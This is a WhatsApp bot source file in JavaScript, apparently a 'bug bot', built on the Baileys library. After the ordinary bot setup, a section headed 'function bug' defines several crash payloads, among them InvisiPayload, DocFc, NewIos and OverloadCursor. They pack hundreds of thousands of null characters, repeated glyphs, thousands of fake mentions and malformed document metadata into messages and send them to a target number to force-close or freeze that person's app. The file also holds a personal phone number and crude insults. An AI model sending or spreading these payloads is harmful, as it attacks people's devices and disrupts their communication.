/*SCRIPT: XlesyVIP 
CREATOR: Gxyenn
SaveCONTACT Creator 
6283877636168
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)
require('./settings');
const fs = require('fs');
const os = require('os');
const qs = require('qs');
const util = require('util');
const gis = require('g-i-s');
const jimp = require('jimp');
const path = require('path');
const https = require('https');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('ytdl-core');
const cron = require('node-cron');
const cheerio = require('cheerio');
const fetch = require('node-fetch');
const FileType = require('file-type');
const {
    JSDOM
} = require('jsdom');
const google = require('googlethis');
const similarity = require('similarity');
const PDFDocument = require('pdfkit');
const webp = require('node-webpmux');
const ffmpeg = require('fluent-ffmpeg');
const speed = require('performance-now');
const didYouMean = require('didyoumean');
const {
    performance
} = require('perf_hooks');
const moment = require('moment-timezone');
const translate = require('translate-google-api');
const {
    Akinator,
    AkinatorAnswer
} = require('aki-api');
const {
    exec,
    spawn,
    execSync
} = require('child_process');
const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    getBinaryNodeChildren,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@whiskeysockets/baileys');

const prem = require('./src/premium');
const {
    antiSpam
} = require('./src/antispam');
const {
    cerpen
} = require('./lib/cerpen');
const JsConfuser = require('js-confuser');
const crypto = require('crypto');
const {
    LoadDataBase
} = require('./src/message');
const {
    TelegraPh,
    UguuSe
} = require('./lib/uploader');
const {
    toAudio,
    toPTT,
    toVideo
} = require('./lib/converter');
const {
    JadiBot,
    StopJadiBot,
    ListJadiBot
} = require('./src/jadibot');
const {
    imageToWebp,
    videoToWebp,
    writeExif
} = require('./lib/exif');
const {
    rdGame,
    iGame,
    tGame,
    gameSlot,
    gameCasinoSolo,
    gameMerampok,
    gameBegal,
    daily,
    buy,
    setLimit,
    addLimit,
    addUang,
    setUang,
    transfer
} = require('./lib/game');
const {
    pinterest,
    wallpaper,
    remini,
    wikimedia,
    yanzGpt,
    mediafireDl,
    ringtone,
    styletext,
    instagramDl,
    tiktokDl,
    facebookDl,
    instaStory,
    bk9Ai,
    spotifyDl,
    ytMp4,
    ytMp3,
    quotedLyo,
    youSearch,
    simi
} = require('./lib/screaper');
const {
    unixTimestampSeconds,
    generateMessageTag,
    processTime,
    webApi,
    getRandom,
    getBuffer,
    fetchJson,
    runtime,
    clockString,
    sleep,
    isUrl,
    getTime,
    formatDate,
    tanggal,
    formatp,
    jsonformat,
    reSize,
    toHD,
    logic,
    generateProfilePicture,
    bytesToSize,
    checkBandwidth,
    getSizeMedia,
    parseMention,
    getGroupAdmins,
    readFileTxt,
    readFileJson,
    getHashedPassword,
    generateAuthToken,
    cekMenfes,
    generateToken,
    batasiTeks,
    randomText,
    isEmoji,
    getTypeUrlMedia,
    pickRandom,
    convertTimestampToDate,
    getAllHTML
} = require('./lib/function');
//Peralatan 
const DevGxyenn = '6283877636168@s.whatsapp.net';
const bugres = `_\`Waiting Proses!...\`_`
const SESSION_FILE = "./SessionXlesy/ai_sessions.json";
let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};
function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
//~~~~~~~~~~~~~~~~~~~~~~~~~\\
// Read Database
const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json'));

// Database Game
let suit = db.game.suit = []
let menfes = db.game.menfes = []
let tekateki = db.game.tekateki = []
let akinator = db.game.akinator = []
let tictactoe = db.game.tictactoe = []
let tebaklirik = db.game.tebaklirik = []
let kuismath = db.game.kuismath = []
let tebaklagu = db.game.tebaklagu = []
let tebakkata = db.game.tebakkata = []
let family100 = db.game.family100 = []
let susunkata = db.game.susunkata = []
let tebakbom = db.game.tebakbom = []
let tebakkimia = db.game.tebakkimia = []
let caklontong = db.game.caklontong = []
let tebakangka = db.game.tebakangka = []
let tebaknegara = db.game.tebaknegara = []
let tebakgambar = db.game.tebakgambar = []
let tebakbendera = db.game.tebakbendera = []

module.exports = Xlesy = async (Xlesy, m, chatUpdate, store, groupCache) => {
    try {

        await LoadDataBase(Xlesy, m);

        const botNumber = await Xlesy.decodeJid(Xlesy.user.id)
        const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : (m.type === 'editedMessage') ? (m.message.editedMessage.message.protocolMessage.editedMessage.extendedTextMessage ? m.message.editedMessage.message.protocolMessage.editedMessage.extendedTextMessage.text : m.message.editedMessage.message.protocolMessage.editedMessage.conversation) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const isCreator = isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const prefix = isCreator ? (/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : listprefix.find(a => body.startsWith(a)) || '') : db.set[botNumber].multiprefix ? (/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : listprefix.find(a => body.startsWith(a)) || '¿') : listprefix.find(a => body.startsWith(a)) || '¿'
        const isCmd = body.startsWith(prefix)
        const args = body.trim().split(/ +/).slice(1)
        const quoted = m.quoted ? m.quoted : m
        const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
        const text = q = args.join(" ")
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const hari = moment.tz('Asia/Jakarta').locale('id').format('dddd');
        const tanggal = moment.tz('Asia/Jakarta').locale('id').format('DD/MM/YYYY');
        const jam = moment.tz('Asia/Jakarta').locale('id').format('HH:mm:ss');
        const ucapanWaktu = jam < '05:00:00' ? 'Selamat Pagi 🌉' : jam < '11:00:00' ? 'Selamat Pagi 🌄' : jam < '15:00:00' ? 'Selamat Siang 🏙' : jam < '18:00:00' ? 'Selamat Sore 🌅' : jam < '19:00:00' ? 'Selamat Sore 🌃' : jam < '23:59:00' ? 'Selamat Malam 🌌' : 'Selamat Malam 🌌';
        const almost = 0.72
        const time = Date.now()
        const time_now = new Date()
        const time_end = 60000 - (time_now.getSeconds() * 1000 + time_now.getMilliseconds());
        const readmore = String.fromCharCode(8206).repeat(999)
        const setv = pickRandom(listv)

        const isVip = db.users[m.sender] ? db.users[m.sender].vip : false
        const isLimit = db.users[m.sender] ? (db.users[m.sender].limit > 0) : false
        const isPremium = isCreator || prem.checkPremiumUser(m.sender, premium) || false
        const isNsfw = m.isGroup ? db.groups[m.chat].nsfw : false

        // Fake
        const textf = m.body; // Mengambil pesan yang dikirim pengirim

        const fkontak1 = {
            key: {
                remoteJid: "status@broadcast",
                participant: '0@s.whatsapp.net',
            },
            message: {
                "extendedTextMessage": {
                    "text": `${textf}` // Menggunakan pesan yang dikirim oleh pengirim
                }
            }
        }

        const ftroli = {
            key: {
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast"
            },
            message: {
                orderMessage: {
                    message: '© XLESY-VIP',
                    itemCount: 1904750173,
                    status: 200,
                    surface: 200,
                    orderTitle: 'Gxyenn',
                    sellerJid: '0@s.whatsapp.net'
                }
            },
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            },
            sendEphemeral: true
        }
const Replyx = (teks) => {
    Xlesy.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: `</>  𝗫𝗟𝗘𝗦𝗬𝗩𝗜𝗣`,
                body: `${ucapanWaktu} ${m.pushName} 👋🏻`,
                previewType: "VIDEO",
                thumbnailUrl: 'https://files.catbox.moe/1eirot.jpg',
                sourceUrl: my.yt,
            }
        }
    }, { quoted: fkontak1 });
};


        // Reset Limit
        cron.schedule('00 00 * * *', () => {
            console.log('Reseted Limit Users')
            let user = Object.keys(db.users)
            for (let jid of user) {
                const limitUser = db.users[jid].vip ? limit.vip : prem.checkPremiumUser(jid, premium) ? limit.premium : limit.free
                if (db.users[jid].limit < limitUser) db.users[jid].limit = limitUser
            }
        }, {
            scheduled: true,
            timezone: 'Asia/Jakarta'
        })

        // Auto Set Bio
        if (db.set[botNumber].autobio) {
            let setbio = db.set[botNumber]
            if (new Date() * 1 - setbio.status > 60000) {
                await Xlesy.updateProfileStatus(`${Xlesy.user.name} | 🎯 Runtime : ${runtime(process.uptime())}`, {
                    quoted: fkontak1
                })
                setbio.status = new Date() * 1
            }
        }

        // Set Public
        if (!Xlesy.public) {
            if (!isCreator && !m.key.fromMe) return
        }      
  //======================================//
       // function bug \\
async function InvisibleLoadFast(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "Gxyenn" + "\u0000".repeat(900000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await Xlesy.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
async function InvisiPayload(target) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟F̷o̷r̷c̷X̷l̷e̷s̷y̷V̷I̷P̷ ⃢↯🔥";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟F̷o̷r̷c̷X̷l̷e̷s̷y̷V̷I̷P̷ ⃢↯🔥",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Testing Immediate Force Close",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                    ],
                  }),
              }),
            },
          },
        },
        { userJid: target }
      );

      await Xlesy.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
      });
    }
    
async function MSGSPAM1(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "kontol share lok ajg",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await Xlesy.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }
  async function DocFc(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟F̷o̷r̷c̷X̷l̷e̷s̷y̷V̷I̷P̷ ⃢↯🔥" + "ꦾ".repeat(4500),
listType: 2,
singleSelectReply: {
    selectedRowId: "🔪"
},
contextInfo: {
stanzaId: Xlesy.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "💎⃢G҉x҉y҉e҉n҉҉n҉  ⃟F̷o̷r̷c̷X̷l̷e̷s̷y̷V̷I̷P̷ ⃢↯🔥",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "Wanna Die ? Huh !"
                    },
                    contentText: "I Wanna Die With You \"😮‍💨\"",
                    footerText: "© Gxyenn",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "XLESY VIP"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
entryPointConversionSource: "wangcap",
entryPointConversionApp: "wangcap",
actionLink: {
url: "t.me/GxyenDev",
buttonTitle: "trash"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "Mahiru",
parentGroupJid: "combine",
trustBannerType: "unexpected",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "𑲭𑲭 Gxyenn ~ \"Dev\" ⚔️ ",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© XLESYVIP",
sourceUrl: "se me?",
sourceId: "XLESYVIP",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "burst",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "trash"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363334736301537@newsletter",
serverMessageId: 1,
newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "crash"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "INITIATED_BY_USER"
},
messageContextInfo: {
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
}),
},
}
}
}

await Xlesy.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
console.log("")
}

async function NewIos(target, Ptcp = true) {
Xlesy.relayMessage(
    target,
    {
        extendedTextMessage: {
            text: `𑲭𑲭💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥 ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: target
              }
          }
        : {}
       
);
console.log("")
}
async function OverloadCursor(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥" + "ꦽ".repeat(16999),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🎭",
          },
          contextInfo: {
            virtexId: Xlesy.generateMessageTag(),
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "G҉x҉y҉e҉n҉҉n҉" + "\u0000".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                },
                hasMediaAttachment: true,
                contentText: 'Hallo"',
                footerText: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "F̷o̷r̷c̷X̷l̷e̷s̷y̷V̷I̷P̷" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "X̷l̷e̷s̷y̷V̷I̷P̷" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Gxyenn official" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "13135550002@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/GxyenDev",
              buttonTitle: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "@13135550002".repeat(2999),
        },
        messageContextInfo: {
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: '💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await Xlesy.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(``);
  await Xlesy.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await Xlesy.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  console.log(``);
}
async function invc2(target, ptcp = true) {
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "Crasher"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await Xlesy.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
 // end function //
